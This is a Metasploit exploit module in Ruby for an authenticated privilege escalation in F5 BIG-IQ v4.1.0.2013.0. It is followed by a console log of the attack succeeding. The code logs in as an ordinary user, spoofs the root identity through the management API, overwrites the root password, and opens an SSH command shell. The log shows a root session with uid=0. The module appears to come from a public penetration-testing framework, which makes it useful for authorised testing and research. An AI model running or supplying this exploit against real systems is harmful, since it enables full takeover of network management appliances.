##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'json'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "F5 BIG-IQ v4.1.0.2013.0 authenticated arbitrary user password change",
      'Description'    => %q{
      F5 BIG-IQ v4.1.0.2013.0 is vulnerable to a privilege escalation attack which allows
      an attacker to change the root users password. This module does just this, then SSH's in.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile@gmail.com>'
        ],
      'References'     =>
        [
          ['URL', 'http://volatile-minds.blogspot.com/2014/05/f5-big-iq-v41020130-authenticated.html']
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['BIG-IQ 4.1.0.2013.0', {}]
        ],
      'Privileged'     => true,
      'DefaultOptions'  =>
      {
        'SSL' => true,
        'ExitFunction' => "none"
      },
      'Payload'        =>
      {
        'Compat' => {
          'PayloadType'    => 'cmd_interact',
          'ConnectionType' => 'find'
        }
      },
      'DisclosureDate' => "Sep 23 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),
          OptString.new('USERNAME', [true, 'The user to authenticate as.', 'username']),
          OptString.new('PASSWORD', [true, 'The password to authenticate with.', 'password']),
          OptString.new('ADMINISTRATOR', [true, 'The administrator to spoof for privilege escalation', 'root']),
          OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
        ], self.class)
  end

  def exploit
    post = {
      'username' => datastore['USERNAME'],
      'passwd' => datastore['PASSWORD']
    }

    print_status("Authenticating as " + datastore['USERNAME'])

    #Simple post to get us a cookie so we can change our password
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/ui/actions/logmein.html',
      'vars_post' => post
    })

    if res.headers["Location"] != "/"
      fail_with("Authentication failed")
    end

    cookie = res.get_cookies

    #this gets turned into JSON
    #
    #generation will be set in try_generation if it isn't correct
    #
    #This is also the attempt at privilege escalation, so we preserve the password
    post = {
      "name" => datastore['ADMINISTRATOR'],
      "displayName" => "fdsa",
      "generation" => 1,
      "lastUpdateMicros" => 1395360806678747,
      "kind" => "shared:authz:users:usersworkerstate",
      "selfLink" => "https://localhost/mgmt/shared/authz/users/" + datastore['USERNAME'],
      "password" => datastore['PASSWORD'],
      "password2" => datastore['PASSWORD'],
      "state" => "ACTIVE"
    }

    print_status("Escalating privileges to that of " + datastore["ADMINISTRATOR"])

    try_generation(post, cookie, '/mgmt/shared/authz/users/' + datastore['USERNAME'])

    password = Rex::Text.rand_text_alpha(rand(32)+5)

    #this is when we change the password for the root user
    post = {
      "name" => "root",
      "displayName" => "root",
      "generation" => 1,
      "lastUpdateMicros" => 1395359570236413,
      "kind" => "shared:authz:users:usersworkerstate",
      "selfLink" => "https://localhost/mgmt/shared/authz/users/root",
      "password" => password,
      "password2" => password,
      "state" => "ACTIVE"
    }

    select(nil,nil,nil,5)
    print_status("Changing root user password to " + password)

    try_generation(post, cookie, '/mgmt/shared/authz/users/root')

    res = do_login('root', password)

    if res
      print_good("Login Successful with 'root:#{password}'")
      handler(res.lsock)
    end
  end

  def try_generation(put, cookie, uri)
    done = false
    while !done
      res = send_request_cgi({
        'method' => "PUT",
        'uri' => uri,
        'data' => put.to_json,
        'cookie' => cookie
      })

      if res and res.body =~ /Invalid generation/
        put['generation'] = /Need (\d{1,9}), received \d{1,9}/.match(res.body)[1]
      elsif res and res.body =~ /encryptedPassword/
        done = true
      else
        fail_with("Didn't get a response that I expected")
      end
    end
  end
    def do_login(user, pass)

      opts = {
        :auth_methods => ['password', 'keyboard-interactive'],
        :msframework  => framework,
        :msfmodule    => self,
        :port         => 22,
        :disable_agent => true,
        :config => true,
        :password => pass,
        :record_auth_info => true,
        :proxies => datastore['Proxies']
      }

      opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

      begin
        ssh = nil
        ssh = Net::SSH.start(datastore['RHOST'], user, opts)
      rescue Rex::ConnectionError, Rex::AddressInUse
        return nil
      rescue Net::SSH::Disconnect, ::EOFError
        print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
        return nil
      rescue ::Timeout::Error
        print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
        return nil
      rescue Net::SSH::AuthenticationFailed
        print_error "#{rhost}:#{rport} SSH - Failed authentication"
        return nil
      rescue Net::SSH::Exception => e
        print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
        return nil
      end
      if ssh
        conn = Net::SSH::CommandStream.new(ssh, '/bin/sh', true)
        return conn
      end
      return nil
    end
end


__END__

msf exploit(f5_bigiq_passwd_update) > show options

Module options (exploit/linux/http/f5_bigiq_passwd_update):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
ADMINISTRATOR  root             yes       The administrator to spoof for privilege escalation
PASSWORD       notpassword      yes       The password to authenticate with.
Proxies                         no        Use a proxy chain
RHOST          192.168.1.8      yes       The target address
RPORT          443              yes       The target port
SSH_TIMEOUT    30               no        Specify the maximum time to negotiate a SSH session
TARGETURI      /                yes       The URI of the vulnerable instance
USERNAME       username         yes       The user to authenticate as.
VHOST                           no        HTTP server virtual host


Payload options (cmd/unix/interact):

Name  Current Setting  Required  Description

----  ---------------  --------  -----------

Exploit target:

Id  Name
--  ----
0   a


msf exploit(f5_bigiq_passwd_update) > exploit

[+] Login Successful with 'root:qBvBY'
[*] Found shell.
[*] Command shell session 3 opened (192.168.1.31:58165 -> 192.168.1.8:22) at 2014-03-20 21:18:09 -0500

id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t:SystemLow-SystemHigh